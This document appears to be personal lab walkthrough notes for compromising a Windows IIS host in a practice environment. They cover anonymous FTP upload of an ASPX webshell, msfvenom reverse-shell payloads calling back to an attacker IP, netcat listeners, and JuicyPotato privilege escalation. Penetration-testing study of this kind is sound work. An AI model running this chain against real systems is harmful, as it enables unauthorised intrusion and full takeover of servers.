(checklist)

- port scan
- version scan
- service scan

COMMANDS:
Lets perform another NSE Default-Scriptscan on FTPservice:
 - nmap -sC -sV -p21 192.168.121.132 -oA ftp-enum

PORT   STATE SERVICE VERSION
21/tcp open  ftp     FileZilla ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x 1 ftp ftp              0 Jul 16  2020 aspnet_client
| -rw-r--r-- 1 ftp ftp            689 Jul 16  2020 iisstart.htm
|_-rw-r--r-- 1 ftp ftp         184946 Jul 16  2020 welcome.png
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Our scan shows that FTPallows anonymous login access. Also, it seems that we are able to accessthe root folder of an IISserver through FTP.

Test if you can upload a file through FTP:
ftp <ip-of-king-arthur>
 - user: anonymous pass: anonymous
 - put test.txt
 - dir (check if the file is in there)
Check in the web:
 - http://<kali-ip>/test.txt

Go to kali:
 - locate *.aspx
 - cp -f /usr/share/webshells/aspx/cmdasp.aspx . / to_your_working_dir/
 - exit ftp and relogin
 - put cmdasp.aspx
 - check the web | http://<kali-ip>/test.txt | textbox command: whoami and whoami \priv
 - you are able to check details through web

Build the initial payload:
msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.121.131  lport=1234 -f exe -o initial.exe
 - login to ftp
 - binary
 - upload this through ftp
 - check current dir through web (this is in C:\windows\system32\inetsrv

Normally the default root folder of an IISweb server is C:\inetpub\wwwroot
Lets check if our payload was uploaded to thatdirectory.dir  C:\inetpub\wwwrootIn
 - on the web type | dir  C:\inetpub\wwwroot (initial.exe is in here)

Listen to initial payload's port:
nc -nlvp 1234

Type C:\inetpub\wwwroot\initial.exe in the Command field and select execute.
 - gained initial access

Let's begin the escalation of privilege:
 - We noticed above that SeImpersonatePrivilegeis one of the privileges that is available for the service account. We can leverage this with JuicyPotatoattack.
 - Download JuicyPotatoAttack from https://github.com/ohpe/juicy-potato/releases/tag/v0.1
 - Download the JuicyPotato.exetoKali and move it to your working directory. Use the command below in Kali 2021.mv /home/kali/Downloads/JuicyPotato.exe .

Build the final payload:
msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.121.131 lport=1235 -f exe -o final.exe
 - transfer both through ftp
 - binary
 - put JuicyPotato.exe
 - put final.exe

Listen to final payload's port:
nc -nlvp 1235

Run the JuicyPotatoAttack:
JuicyPotato.exe -p final.exe -l 9999 -t *

Go back to the terminal